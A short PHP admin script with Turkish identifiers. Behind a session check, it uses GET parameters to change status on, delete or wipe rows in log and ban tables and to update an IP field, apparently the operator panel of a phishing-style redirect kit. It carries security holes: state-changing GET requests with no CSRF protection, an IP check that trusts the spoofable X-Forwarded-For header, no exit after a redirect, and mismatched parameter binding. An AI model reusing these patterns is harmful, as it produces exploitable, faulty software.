<?php
session_start();
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();
include '../config.php';
 
 

if($_SESSION["ipx"] != $ipcik)  { 
   header("location:cikis.php"); 
 }


$gtc = $_SESSION["username"];
$sorgu = $connect->prepare("SELECT * FROM icq WHERE mail = ?");
$sorgu->bindParam(1, $gtc, PDO::PARAM_INT);
$sorgu->execute();
$cikti = $sorgu->fetch(PDO::FETCH_ASSOC);


 
 
function loginkontrol (){
    if(empty($_SESSION["username"])){
        header("location:bos.html");
        exit;
    }
}

$brt = $_GET['connect'];
$klt = $_GET['trx'];
$tnt = $_GET['mnt'];
if($_GET['islem'] == "yonlendir"){
    loginkontrol ();
    $sorgu = $connect->prepare("UPDATE gtm SET durum = ? WHERE id = ?");
    $sorgu->bindParam(1, $brt, PDO::PARAM_INT);
    $sorgu->bindParam(2, $klt, PDO::PARAM_INT);
    $sorgu->execute();
    if ($sorgu) {
    echo "<script>window.location.href='../log.php';</script>";
    } else {
    echo "<script>window.location.href='../log.php';</script>";
    } 
} 





if($brt == "a5"){
    loginkontrol();
    $sorgu = $connect->prepare("DELETE FROM gtm WHERE id = ?");
    $sorgu->bindParam(1, $klt, PDO::PARAM_INT);
    $sorgu->execute();
    if ($sorgu) {
    echo "<script>window.location.href='../log.php';</script>";
    } else {
    echo "<script>window.location.href='../log.php';</script>";
    } 
}

if($brt == "a6"){
    loginkontrol();
    $sorgu = $connect->prepare("DELETE FROM gtm");
    $sorgu->bindParam(1, $klt, PDO::PARAM_INT);
    $sorgu->execute();
    if ($sorgu) {
    echo "<script>window.location.href='../log.php';</script>";
    } else {
    echo "<script>window.location.href='../log.php';</script>";
    } 
}

if($brt == "abc6"){
    loginkontrol();
    $sorgu = $connect->prepare("DELETE FROM ban");
    $sorgu->bindParam(1, $klt, PDO::PARAM_INT);
    $sorgu->execute();
    if ($sorgu) {
    echo "<script>window.location.href='../log.php';</script>";
    } else {
    echo "<script>window.location.href='../log.php';</script>";
    } 
}

if($brt =="6cba"){
    loginkontrol ();
    $klt = '1';
	$bans = $_GET['sitex'];
  	$sorgu = $connect->prepare("UPDATE icq SET ip = ? WHERE id = ?");
	$sorgu->bindParam(1, $bans, PDO::PARAM_STR);
	$sorgu->bindParam(2, $klt, PDO::PARAM_STR);
	$sorgu->execute();
	echo "<script>window.location.href='../vst.php';</script>";

}

?>